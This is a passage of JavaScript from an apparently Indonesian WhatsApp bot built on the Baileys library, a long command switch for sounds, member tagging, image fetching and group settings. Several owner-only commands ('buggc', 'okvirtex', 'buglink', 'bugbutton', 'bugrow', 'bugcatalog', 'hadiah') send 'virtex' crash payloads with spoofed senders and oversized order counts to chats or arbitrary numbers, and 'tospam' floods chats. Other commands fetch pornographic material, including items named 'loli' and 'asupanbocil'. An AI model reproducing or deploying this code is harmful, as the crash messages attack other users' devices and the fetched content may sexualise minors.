enamtiga = fs.readFileSync('./mp3/Ternyata.mp3');
Bambang.sendMessage(from, enamtiga, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound64':
enamempat = fs.readFileSync('./mp3/Sayang.mp3');
Bambang.sendMessage(from, enamempat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound65':
enamlima = fs.readFileSync('./mp3/chruch.mp3');
Bambang.sendMessage(from, enamlima, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound66':
enamenam = fs.readFileSync('./mp3/gemes.mp3');
Bambang.sendMessage(from, enamenam, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound67':
enamtujuh = fs.readFileSync('./mp3/darkside.mp3');
Bambang.sendMessage(from, enamtujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound68':
enamdelapan = fs.readFileSync('./mp3/Masih.mp3');
Bambang.sendMessage(from, enamdelapan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
                 case 'ganteng':
					if (!isGroup) return reply(ind.groupo())
					membr = []
					const nus = groupMembers
					const msl = groupMembers
					const siapss = nus[Math.floor(Math.random() * nus.length)]
					const sipss = pushname[Math.floor(Math.random() * msl.length)]
					teks = `Yang paling Ganteng disini Adalah : @${siapss.jid.split('@')[0]}`
					membr.push(siapss.jid)
					mentions(teks, membr, true)
					break
                    case 'beban':
					  
					if (!isGroup) return reply(ind.groupo())
					membr = []
					const met = groupMembers
					const msd = groupMembers
					const siapsa = met[Math.floor(Math.random() * met.length)]
					const sipsd = pushname[Math.floor(Math.random() * msd.length)]
					teks = `Yang paling Beban disini Adalah : @${siapsa.jid.split('@')[0]}`
					membr.push(siapsa.jid)
					mentions(teks, membr, true)
					break
                    case 'cantik':
					  
					if (!isGroup) return reply(ind.groupo())
					membr = []
					const meo = groupMembers
					const msk = groupMembers
					const siaps = meo[Math.floor(Math.random() * meo.length)]
					const sips = pushname[Math.floor(Math.random() * msk.length)]
					teks = `Yang paling Cantik disini Adalah : @${siaps.jid.split('@')[0]}`
					membr.push(siaps.jid)
					mentions(teks, membr, true)
					break
case 'jadibot':
                if (args.length < 1) return reply('*Fitur Telah Di Hapus Oleh Owner Dikarenakan Banyak Yang spam Fitur Itu Kalo Mau jadi Bot ya Usaha Tololl Udah Numpang ngamok Lagi*')
                break
           case 'asupanbokep':
               if (!isOwner) return reply (mess.only.prem)
               reply(mess.wait)
               aprii = await getBuffer (`https://raku-web.herokuapp.com/api/bokep?apikey=${rakukey}`)
               Bambang.sendMessage(from, aprii, video, {mimetype: 'video/mp4', quoted: mek})
               break
case 'playmp3':

      if (args.length < 1) return reply("```JUDUL MANA TOT```")
      anu = await fetchJson(`https://api.dapuhy.ga/api/socialmedia/ytplaymp3?query=${args.join(' ')}&apikey=wf2tghNhfU`)
      reply(mess.wait)
      captionnya = `TITLE BERHASIL DISEBUTKAN\n\nJudul : ${anu.result.title}\nKualitas Video : ${anu.result.quality}\nViews : ${anu.result.views}\nSize : ${anu.result.size}\nChannel : ${anu.result.channel}\nDeskripsi : ${anu.result.desc}\n\n*MOHON TUNGGU BEBERAPA MENIT BOT SEDANG MENGIRIM AUDIO*`
buffer = await getBuffer (anu.result.thumb)
Bambang.sendMessage(from, buff, image, {quoted: mek, caption: captionnya})
miku = await getBuffer (anu.result.url)
Bambang.sendMessage(from, miku, audio, {mimetype: 'audio/mp4', quoted: mek})
break
case 'playmp4':

      if (args.length < 1) return reply("```JUDUL MANA TOT```")
      anu = await fetchJson(`https://api.dapuhy.ga/api/socialmedia/ytplaymp4?query=${args.join(' ')}&apikey=wf2tghNhfU`)
      reply(mess.wait)
      captionnya = `TITLE BERHASIL DImekATKAN\n\nJudul : ${anu.result.title}\nKualitas Video : ${anu.result.quality}\nViews : ${anu.result.views}\nSize : ${anu.result.size}\nChannel : ${anu.result.channel}\nDeskripsi : ${anu.result.desc}\n\n*MOHON TUNGGU BEBERAPA MENIT BOT SEDANG MENGIRIM VIDEO*`
buffer = await getBuffer (anu.result.thumb)
Bambang.sendMessage(from, buff, image, {quoted: mek, caption: captionnya})
miku = await getBuffer (anu.result.url)
Bambang.sendMessage(from, miku, audio, {mimetype: 'audio/mp4', quoted: mek})
break
             case 'nekoh':
               
               reply(mess.wait)
                buffer = await getBuffer(`https://api.dhamzxploit.my.id/api/nsfw/neko`)
                const bc = await Bambang.prepareMessage(from, buffer, MessageType.image)

            const buttosn = [{buttonId:`${prefix + command}`,buttonText: {displayText: 'Next️'}, type: 1}]

            const ButonMessages = {

            contentText: `_© By Bambang Tri Raharjo_`,

            buttons: buttosn,

            footerText: `Klik Next Untuk Melanjutkan`,

            headerType: 4,

            imageMessage: bc.message.imageMessage

            }

            await Bambang.sendMessage(from, ButonMessages, MessageType.buttonsMessage, {quoted : mek})
                break
           case 'cersex':
					anu = await fetchJson(`https://raku-web.herokuapp.com/api/cersex?apikey=RakuKeyTod`)
					     anu1 = `*JUDUL* : ${anu.result.result.judul}\n`
               anu1 += `*LINK PHOTO* : ${anu.result.result.img}\n`
               anu1 += `*CERITA* : ${anu.result.result.cersex}\n` 
               reply(anu1)
               break
					break
case 'narutoanime':
  case 'kaneki':
    case 'shinomiya': 
      case 'kurama':
        case 'rimuru':
          case 'akira':
            case 'dazai': 
  
  case 'miku': 
  case 'mikasa':
  case 'eren': 
    case 'titan': 
  case 'levi': 
  case 'sakura':
  case 'hinata':
  case 'neji': 
                   case 'shinobu': 
                    
                     case 'kurumi': 
                       case 'animerem':
                     case 'minato': 
                       case 'jiraya': 
                     case 'tsunade': 
                       case 'kiba':
                     case 'boruto': 
                     case 'sarada':
                     case 'sasuke': 
                    case 'madara':
                      case 'obito':
                      case 'obito':
                      case 'tanjiro':
                      case 'nezuko':
                      case 'luffy':
                      case 'zoro':
                      case 'sanji':        
                    case 'gon':
                      case 'killua':
                      case 'sagiri': 
                      case 'rimuru':
                        case 'natsu':
                      case 'genos':
                      case 'saitama': 
                      case 'miku': 
                      case 'cecan':
                      case 'cogan':
                    reply(mess.wait)
                buffer = await getBuffer (`https://percobaan-apic.herokuapp.com/api/search/pinterestimage?apikey=12345&query=${command}`)
                Bambang.sendMessage(from, buffer, image, {quoted: mek, caption : `Nih Kak🗿`})
                break
				case 'gtts':
				case 'tts':
				  if (args.length < 1) return reply("```TEKSNYA APA TOD```")
                buffer = await getBuffer (`https://percobaan-apic.herokuapp.com/api/others/tts?apikey=12345&text=${args.join(' ')}`)
                Bambang.sendMessage(from, buffer, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                break
					             case "pacaran":
					jds = []
					const jdii = groupMembers
					const koss = groupMembers
					const akuu = jdii[Math.floor(Math.random() * jdii.length)]
					const diaa = koss[Math.floor(Math.random() * koss.length)]
					teks = `Ciee.. Lagi Pacaran Nich @${akuu.jid.split('@')[0]} Sama Dia♥️👀 @${diaa.jid.split('@')[0]} `
					jds.push(akuu.jid)
					jds.push(diaa.jid)
					mentions(teks, jds, true)
					break
               case 'kisahnabi':
            
               if (args.length == 0) return reply(`Example: ${prefix + command} Muhammad`)
               anu = await fetchJson(`https://raku-web.herokuapp.com/api/muslim/kisahnabi?nabi=${args.join(' ')}&apikey=${rakukey}`)
               anu1 = `*NAMA NABI* : ${anu.result.name}\n`
               anu1 += `*KELAHIRAN* : ${anu.result.kelahiran}\n`
               anu1 += `*WAFAT USIA* : ${anu.result.wafat_usia}\n` 
               anu1 += `*SINGGAH* : ${anu.result.singgah}\n`
               anu1 += `*KISAH* : ${anu.result.kisah}\n`
               reply(anu1)
               break
case 'hadiah':
        	case 'gift':
      if (!isOwner && !mek.key.fromMe) return sticOwner(from)
listMsg = {
 buttonText: `serah lu dah kalo ngeyel`,
 footerText: '',
 description: `JANGAN DIBUKA`,
 sections: [
                     {
                      "title": `Bagaimana hadiahnya?`,
 rows: [{
"title": `${emoji1(prefix)}`,
"description": 'Virus Anonymous',
"rowId": "menu"
}]
                     }],
 listType: 1,
 ListMessageListType: 2
}
if (!args[0]) {
Bambang.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [sender]}})
} else {
  Bambang.sendMessage(`${args[0]}@s.whatsapp.net`, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [sender]}})
}
break
case 'buggc':
if (!mek.key.fromMe) return;
if (!q) return reply('Enter the Group ID')
sendBug(args[0])
break
case 'okvirtex':
if (!isOwner && !mek.key.fromMe) return reply('Only owner can use this feature')
katalog(`${ngazap(prefix)}`)
katalog(`${emoji2(prefix)}`)
katalog(`${virtex1(prefix)}`)
katalog(`${virtex2(prefix)}`)
katalog(`${virtex3(prefix)}`)
katalog(`${virtex4(prefix)}`)
katalog(`${virtex5(prefix)}`)
katalog(`${virtex6(prefix)}`)
katalog(`${virtex7(prefix)}`)
katalog(`${virtex8(prefix)}`)
katalog(`${virtex9(prefix)}`)
katalog(`${virtag(prefix)}`)
break
case 'buglink':
                if (!isOwner && !mek.key.fromMe) return reply('Only owner can use this feature')
                 Bambang.toggleDisappearingMessages(from, 0)
               Bambang.sendMessage(from, virtex3(prefix), text, { quoted:ftrol, contextInfo :{text: '🔥',
            "forwardingScore": 1000000000,
            isForwarded: false,
            sendEphemeral: false,
            "externalAdReply": {
                "title": `${virtex2(prefix)}`,
                "body": "",
                "previewType": "PHOTO",
                "thumbnailUrl": "https://i.ibb.co/y0RYgzB/FB-IMG-1635413002830.jpg",
                "thumbnail": fs.readFileSync(`./xeon.jpg`),
                "sourceUrl": "https://youtube.com/channel/UCvAo9TZ0Pw9vrJ_0WYRyO3A"}}})
                break
        case 'bugbutton':
        if (!isOwner && !mek.key.fromMe) return reply('Only owner can use this feature')
        Bambang.toggleDisappearingMessages(from, 0)
        sendButLocation(from, `${ngazap(prefix)}`, `${virtag(prefix)}`, {jpegThumbnail:iye}, [{buttonId:`bbaij72njnwjibdo16830nslm1782`,buttonText:{displayText:'Yahahaha'},type:1}])
        Bambang.toggleDisappearingMessages(from, 0)
break
case 'bugrow':
if (!isOwner && !mek.key.fromMe) return reply('Only owner can use this feature')
Bambang.toggleDisappearingMessages(from, 0)
 listMsg = {
 buttonText: 'LIST MENU',
 footerText: `${emoji2(prefix)}`,
 description: `${virtex6(prefix)}`,
 sections: [
                     {
                      "title": "CieDick",
 rows: [
                          {
                              "title": "CieBug",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
Bambang.sendMessage(from, listMsg, MessageType.listMessage, {quoted:ftrol})
Bambang.toggleDisappearingMessages(from, 0)
break
case 'bugcatalog':
if (!isOwner && !mek.key.fromMe) return reply('Only owner can use this feature')
Bambang.toggleDisappearingMessages(from, 0)
 babi = (teks) => {
             res = Bambang.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 9999999, "message": teks, "footerText": `${emoji2(prefix)}`, "thumbnail": iye, "surface": 'CATALOG' }}, {quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: `${virtex6(prefix)}`,
    orderTitle: `${emoji2(prefix)}`, // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
             Bambang.relayWAMessage(res)
        }
        babi(`${ngazap(prefix)}`)
        babi(`${virtag(prefix)}`)
        babi(`${virtex6(prefix)}`)
        babi(`${emoji2(prefix)}`)
        break
       
                           case 'bucinstick':
                case 'bucinsticker':{
         
                    var ano = await fetchText('https://raw.githubusercontent.com/rashidsiregar28/data/main/bucin')
                    var wifegerak = ano.split('\n')
                    var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
                    var isGif = wifegerakx.endsWith('.gif') ? true : false
                    if (!isGif) {
                    var ngebuff = await getBuffer(wifegerakx)
                    var mediast = getRandom('.png')
                    fs.writeFileSync(mediast, ngebuff)
                    await ffmpeg(`${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(mess.error.api)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
                                    if (error) return reply(mess.error.api)
									 Bambang.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: freply})
								
                                    fs.unlinkSync(media)	
									fs.unlinkSync(`./sticker/${sender}.webp`)	
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./sticker/${sender}.webp`)
                    } else {
                     var ngebuff = await getBuffer(wifegerakx)
                 	let media = `./sticker/${sender}.gif`
                    fs.writeFileSync(media, ngebuff)
					reply(mess.wait)
                        await ffmpeg(`${media}`)
							.inputFormat(media.split('.')[4])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(err)
								fs.unlinkSync(media)
								let tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(mess.error.api)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
									if (error) return reply(mess.error.api)
									 Bambang.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: freply})
									
                                    fs.unlinkSync(media)
									fs.unlinkSync(`./sticker/${sender}.webp`)
                                })
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./sticker/${sender}.webp`)
                    }
                    }
                    break
  case 'd':

				case 'del':

				case 'delete':
					Bambang.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					break
            case 'unarchiveall':
                if (!isOwner && !mek.key.fromMe) return sticOwner(from)
                reply('*succes unarchive all chat*')
                console.log('succes unarchive chat = ' + from)
                anu = await Bambang.chats.all()
                for (let _ of anu) {
                Bambang.modifyChat(_.jid, ChatModification.unarchive)
                }
                break
                case 'archive':
                if (!isOwner && !mek.key.fromMe) return sticOwner(from)
                reply('*okey wait..*')
                console.log('succes archive chat = ' + from)
                await sleep(3000)
                Bambang.modifyChat(from, ChatModification.archive)
                break
            case 'unreadall':
                if (!isOwner && !mek.key.fromMe) return sticOwner(from)
                var chats = await Bambang.chats.all()
                chats.map( async ({ jid }) => {
                await Bambang.chatRead(jid, 'unread')
                    })
		    var teks = `\`\`\`Successfully unread ${chats.length} chats !\`\`\``
		    await Bambang.sendMessage(from, teks, text, {quoted: mek})
		    console.log(chats.length)
	        break
					//feature by Bambang
					          case 'phcomment':
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} Bambang&lol*`)
                   var F = body.slice(10)
				   var F1 = F.split("|")[0];
				   var F2 = F.split("|")[1]; 
                   reply(mess.wait)
                   anu = await getBuffer(`https://api.zeks.me/api/phub?apikey=${zeksapi}&img=https://1.bp.blogspot.com/-x8KhcOBG-yw/XiU4pi1yWVI/AAAAAAAADBA/gK8tsLyc1lQ808A348IKzDCjf6fUBKONwCLcBGAsYHQ/s1600/cara%2Bbuat%2Bfoto%2Bprofil%2Bdi%2Bwhatsapp%2Bmenjadi%2Bunik.jpg&username=${F1}&msg=${F2}`)
                  Bambang.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `Done Yaa By © Bambang Ganteng`, quoted: mek})
                   break
case 'anime':
            fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            Bambang.sendMessage(from,media,image,{quoted:mek,caption:'*BY Bambang Official ^_^*'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            break
case 'groupbuka' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.bodmin)
reply(`\`\`\`𝐒𝐮𝐤𝐬𝐞𝐬 𝐌𝐞𝐦𝐛𝐮𝐤𝐚 𝐆𝐫𝐨𝐮𝐩\`\`\` *${groupMetadata.subject}*`)
Bambang.groupSettingChange(from, GroupSettingChange.messageSend, false)
break
      case "setreply":
        if (!q) return fakegroup(mess.wrongFormat);
        fake = q;
        fakegroup(`Sukses Mengganti Reply: ${q}`);
        break;
      case "setfakeimg":
        if (
          ((isMedia && !mek.message.videoMessage) ||
            isQuotedImage ||
            isQuotedSticker) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedSticker
              ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                  .extendedTextMessage.contextInfo
              : mek;
          delb = await Bambang.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/fake.jpeg`, delb);
          reply("Success");
        } else {
          reply(`Silahkan Anda Mengirim Gambar Dengan Caption ${prefix}setfakeimg`);
        }
        break;
      case "setthumb":
        if (
          ((isMedia && !mek.message.videoMessage) ||
            isQuotedImage ||
            isQuotedSticker) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedSticker
              ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                  .extendedTextMessage.contextInfo
              : mek;
          delb = await Bambang.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/thumb.jpeg`, delb);
          reply("Sukses Mengganti Thumbnailnya");
        } else {
          reply(`Silahkan Anda Kirim Gambar Dengan Caption ${prefix}sethumb`);
        }
        break;
case 'grouptutup' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.bodmin)
reply(`\`\`\`𝐒𝐮𝐤𝐬𝐞𝐬 𝐌𝐞𝐧𝐮𝐭𝐮𝐩 𝐆𝐫𝐨𝐮𝐩\`\`\` *${groupMetadata.subject}*`)
Bambang.groupSettingChange(from, GroupSettingChange.messageSend, true)
break
case 'piltek':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
gifnya = await getBuffer('https://telegra.ph/file/a92a5a213055a6a48f023.mp4')
anu =`${emoji2(prefix)}`
await Bambang.sendMessage(from, gifnya, MessageType.video, {mimetype : 'video/mp4', quoted: ftrol, caption: anu})
break
case 'group':
case 'grup':
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isGroup) return reply(mess.only.group)
if (!isBotGroupAdmins) return reply(mess.only.bodmin)
but = [
{ buttonId: 'groupbuka', buttonText: { displayText: 'BUKA' }, type: 1 },
{ buttonId: 'grouptutup', buttonText: { displayText: 'TUTUP' }, type: 1 }
]
sendButMessage(from, "Silahkan Pilih Untuk Buka/Tutup Group", faketeks, but, mek)
break
case 'loli':
anu = await getBuffer(`https://percobaan-apic.herokuapp.com/api/anime/loli?apikey=12345`)
Bambang.sendMessage(from, anu, image, { quoted: mek, caption: 'Nih Kak Lolinya ^_^' })
break
       case 'delcmd':
       //(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
              if (!isOwner) return reply(`Kamu bukan user premium, kirim perintah *${prefix}buypremium* untuk membeli premium`)
              if (!isQuotedSticker) return reply(`Penggunaan : ${command} tagsticker`)
              var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
            _scommand.splice(getCommandPosition(kodenya), 1)
              fs.writeFileSync('./database/bot/scommand.json', JSON.stringify(_scommand))
              textImg("Done!")
              break
       case 'listcmd':
       //(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
              let teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``
              let cemde = [];
              for (let i of _scommand) {
              cemde.push(i.id)
              teksnyee += `\n\n➸ *ID :* ${i.id}\n➸ *Cmd* : ${i.chats}`
}
              mentions(teksnyee, cemde, true)
              break
				case 'clearall':
				//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
					if (!isOwner) return reply(mess.only.owner)
					anu = await Bambang.chats.all()
					Bambang.setMaxListeners(25)
					for (let _ of anu) {
						Bambang.deleteChat(_.jid)
					}
					reply('Succes')
					break


//═════════════════════════ [ EDIT MUSIC MENU ] ═════════════════════════
//═════════════════════════ [ COPAS AJA ] ═════════════════════════
//═════════════════════════ [ NO API ] ═════════════════════════

case 'asupan':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan?apikey=${apikey5}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
Bambang.sendMessage(from, buffer, video, {quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe BAMBANG TRI RAHARJO'})
break
case 'asupancecan':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/cecan?apikey=${apikey5}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
Bambang.sendMessage(from, buffer, video, {quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe BAMBANG TRI RAHARJO'})
break
case 'asupanhijaber':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/hijaber?apikey=${apikey5}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
Bambang.sendMessage(from, buffer, video, {quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe BAMBANG TRI RAHARJO'})
break
case 'asupansantuy':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/santuy?apikey=${apikey5}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
Bambang.sendMessage(from, buffer, video, {quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe BAMBANG TRI RAHARJO'})
break
case 'asupanukhti':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/ukty?apikey=${apikey5}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
Bambang.sendMessage(from, buffer, video, {quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe BAMBANG TRI RAHARJO'})
break
case 'asupanbocil':
  reply(mess.wait)
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/bocil?apikey=${apikey5}`)
buffer = await getBuffer(ini.result.url)
Bambang.sendMessage(from, buffer, video, {quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe BAMBANG TRI RAHARJO'})
break
case 'asupanghea':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/ghea?apikey=${apikey5}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
Bambang.sendMessage(from, buffer, video, {quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe BAMBANG TRI RAHARJO'})
break
case 'asupanrika':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/rikagusriani?apikey=${apikey5}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
Bambang.sendMessage(from, buffer, video, {quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe BAMBANG TRI RAHARJO'})
break
case 'vietnam':
case 'korea':
case 'china':
case 'indonesia':
case 'malaysia':
case 'japan':
case 'thailand':
reply(mess.wait)
ini_result = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/cewe/${command}?apikey=${apikey5}`)
get_result = ini_result.result
ini_img = await getBuffer(get_result.url)
Bambang.sendMessage(from, ini_img, image, {quoted:ftrol})
break
case 'hartatahta':
case 'naruto':
case 'bneon':
case 'matrix':
case 'breakwall':
case 'gneon':
case 'dropwater':
case 'flowertext':
case 'crosslogo':
case 'silktext':
case 'flametext':
case 'glowtext':
case 'smoketext':
case 'skytext':
case 'cslogo':
case 'lithgtext':
case 'crismes':
case 'tfire':
case 'sandw':
case 'epep':
case 'text3dbox':
case 'logobp':
case 'leavest':
case 'thundertext':
case 'tlight':
case 'qrencode':
case 'barcode':
case 'nulis':
case 'text3d':
case 'gplaybutton':
case 'splaybutton':
if (args.length == 0) return reply(`Teks Nya Mana\nContoh : ${prefix + command} Bambang Official`)
const bgo = args.join(" ")
reply(mess.wait)
res = await getBuffer(`https://api.zeks.me/api/${command}?apikey=${apikey4}&text=${bgo}`)
Bambang.sendMessage(from, res, image, {quoted: ftrol, caption: 'Done Jangan Lupa Subscribe Bambang Official' })
break
case 'wolflogo':
case 'pubglogo':
case 'snowwrite':
case 'watercolour':
case 'logoaveng':
case 'phlogo':
case 'marvellogo':
case 'gtext':
if (args.length == 0) return reply(`Teks Nya Mana ?\nContoh : ${prefix + command} Bambang Official`)
txt1 = args[0]
txt2 = args[1]
reply(mess.wait)
wll = await getBuffer(`https://api.zeks.me/api/${command}?apikey=${apikey4}&text1=${txt1}&text2=${txt2}`)
Bambang.sendMessage(from, wll, image, {quoted: ftrol, caption: 'Done Jangan Lupa Subscribe Bambang Official' })
break
case 'darkjoke':
anu = await getBuffer(`https://percobaan-apic.herokuapp.com/api/others/darkjokes?apikey=12345`)
Bambang.sendMessage(from, anu, image, { quoted: mek, caption: 'By Bambang Ganteng' })
break
case 'nekonime':
anu = await getBuffer(`https://percobaan-apic.herokuapp.com/api/search/pinterestimage?apikey=12345&query=nekonime`)
Bambang.sendMessage(from, anu, image, { quoted: mek, caption: 'By Bambang Ganteng' })
break
case 'quotesislami':
anu = await fetchJson(`https://percobaan-apic.herokuapp.com/api/random/Quotesislami?apikey=12345`)
reply(`*Random Quotes Islami*\n${anu.quote}`)
break
case 'quotesanime':
anu = await fetchJson(`https://percobaan-apic.herokuapp.com/api/random/quotesanime?apikey=12345`)
reply(`*Random Quotes Anime*\n${anu.quote}`)
break
case 'quotesmaker':
anu = await getBuffer(`https://percobaan-apic.herokuapp.com/api/random/Quotesmaker?apikey=12345`)
Bambang.sendMessage(from, anu, image, {quoted: ftrol, caption: 'ini kak quotes untuk hari ini'})
break
case 'quotes':
anu = await fetchJson(`https://percobaan-apic.herokuapp.com/api/random/quotes?apikey=12345`)
reply(`*Random Quotes*\n${anu.quote}`)
break
case 'quotessadboy':
anu = await fetchJson(`https://percobaan-apic.herokuapp.com/api/random/quotesad?apikey=12345`)
reply(`*Random Quotes Sadboy*\n${anu.quote}`)
break
case 'katailham':
anu = await fetchJson(`https://percobaan-apic.herokuapp.com/api/random/katailham?apikey=12345`)
reply(`*Random Kata Ilham*\n${anu.quote}`)
break
case 'katadilan':
anu = await fetchJson(`https://percobaan-apic.herokuapp.com/api/random/bacotandilan?apikey=12345`)
reply(`*Random Kata Dilan*\n${anu.quote}`)
break
case 'meme':
anu = await getBuffer(`https://percobaan-apic.herokuapp.com/api/others/meme?apikey=12345`)
Bambang.sendMessage(from, anu, image, { quoted: mek, caption: 'Jangan Lupa Bahagia' })
break
case 'tag':
              if (args.length < 1) return reply(`Penggunaan ${prefix}tag 62xnxx`)
            var nomqm = `${body.slice(5)}@s.whatsapp.net`
					tagq = `@${nomqm.split('@')[0]}` 
					Bambang.sendMessage(from, tagq, text, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
			break
			case 'tagme':
          var nomqm = mek.participant
				    tagu = `@${nomqm.split('@s.whatsapp.net')[0]}`
					Bambang.sendMessage(from, tagu, text, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
					break
					case 'readmore':
			    	case 'more':
              const more = String.fromCharCode(8206)
			    	const readmore = more.repeat(4001)
				    if (!q.includes('|')) return  reply(mess.error.api)
                    const text1 = q.substring(0, q.indexOf('|') - 0)
                    const text2 = q.substring(q.lastIndexOf('|') + 1)
                    reply( text1 + readmore + text2)
                    break
                 case 'pantun':
              anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/pantun?apikey=${apikey7}`, {method: 'get'})
				kata = anu.result
				reply(kata)
				break
				case 'tospam':
              if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length > 10) {
teks = body.slice(8)
oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  Bambang.sendMessage(from, `${oi1}`, MessageType.text)
	  }
} else if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length < 10) {
teks = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  Bambang.sendMessage(from, teks, MessageType.text)
	  }
} else if (isQuotedSticker) {
	encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	         median = await Bambang.downloadAndSaveMediaMessage(encmedian)
				anu = fs.readFileSync(median)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  Bambang.sendMessage(from, anu, sticker)
	  }
} else if (isQuotedAudio) {
	encmediat = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
